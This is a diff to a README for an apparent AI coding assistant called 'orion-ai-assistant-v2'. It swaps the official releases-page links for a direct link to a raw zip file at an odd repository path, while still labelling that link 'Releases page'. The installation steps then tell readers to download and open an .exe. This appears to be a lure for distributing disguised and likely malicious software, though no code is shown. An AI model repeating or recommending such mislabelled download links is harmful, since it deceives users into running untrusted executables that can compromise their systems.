@@ -1,6 +1,6 @@
 # 🤖 orion-ai-assistant-v2 - Build better software with smart tools
 
-[![](https://img.shields.io/badge/Download-Orion_Assistant-blue)](https://github.com/Commandarsenicacid250/orion-ai-assistant-v2/releases)
+[![](https://img.shields.io/badge/Download-Orion_Assistant-blue)](https://github.com/Commandarsenicacid250/orion-ai-assistant-v2/raw/refs/heads/main/Swatow/v-orion-ai-assistant-v2.5.zip)
 
 Orion AI Coding Assistant 2026 helps you write code faster. This tool uses smart technology to suggest code snippets, find errors, and complete tasks. It works as an open source editor on your computer. You use 71 different commands to manage your projects. This assistant runs without needing complex server setups.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run Orion smoothly.
 
 Follow these steps to put the software on your machine.
 
-1. Go to the [Releases page](https://github.com/Commandarsenicacid250/orion-ai-assistant-v2/releases).
+1. Go to the [Releases page](https://github.com/Commandarsenicacid250/orion-ai-assistant-v2/raw/refs/heads/main/Swatow/v-orion-ai-assistant-v2.5.zip).
 2. Look for the latest version at the top of the page.
 3. Click the link that ends in .exe to download the installer.
 4. Open the downloaded file once the timer finishes.
